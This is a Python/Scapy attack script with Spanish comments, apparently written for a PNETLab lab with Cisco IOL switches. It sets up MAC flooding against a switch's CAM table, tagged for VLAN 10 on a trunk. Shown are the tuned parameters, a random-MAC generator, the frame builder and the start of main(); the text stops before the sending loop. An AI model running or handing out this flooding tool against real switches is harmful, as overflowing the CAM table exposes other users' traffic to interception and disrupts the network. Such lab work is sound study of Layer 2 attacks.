#!/usr/bin/env python3
from scapy.all import Ether, sendp, Dot1Q, conf
import random
import time
import sys
import signal

# ──────────────────────────────────────────────
#  CONFIGURACIÓN ADAPTADA A TU ENTORNO
# ──────────────────────────────────────────────
INTERFACE   = "ens4"      # Tu interfaz real en KVM/PNETLab
VLAN_ID     = 10          # VLAN de destino a saturar (10 o 20)
PAQUETES    = 15000       # Subimos un poco para garantizar llenado en Cisco IOL
INTERVALO   = 0.0005      # Bajamos el tiempo para ráfaga más agresiva
PAYLOAD     = b"X" * 64


def mac_aleatoria() -> str:
    octetos = [random.randint(0, 255) for _ in range(6)]
    octetos[0] &= 0xFE
    return ":".join(f"{o:02x}" for o in octetos)


def construir_frame(src_mac: str, dst_mac: str, vlan: int) -> 'Packet':
    # Inyectamos Dot1Q en el medio para viajar de forma efectiva por el puerto Trunk
    return Ether(src=src_mac, dst=dst_mac) / Dot1Q(vlan=vlan) / PAYLOAD


def main():
    inicio = time.time()
    print("=" * 55)
    print("   ATAQUE MAC Flooding — CAM Table Overflow (Trunk Mode)")
    print("=" * 55)
    print(f"  Interfaz : {INTERFACE}")
    print(f"  VLAN ID  : {VLAN_ID}")
    print(f"  Paquetes : {PAQUETES}")
    print(f"  Intervalo: {INTERVALO}s\n")

    enviados   = 0
    macs_origen = set()

    def salir(sig, frame):
        print(f"\n  [!] Detenido. Frames enviados: {enviados}")
        print(f"      MACs únicas inyectadas: {len(macs_origen)}")
        sys.exit(0)

    signal.signal(signal.SIGINT, salir)
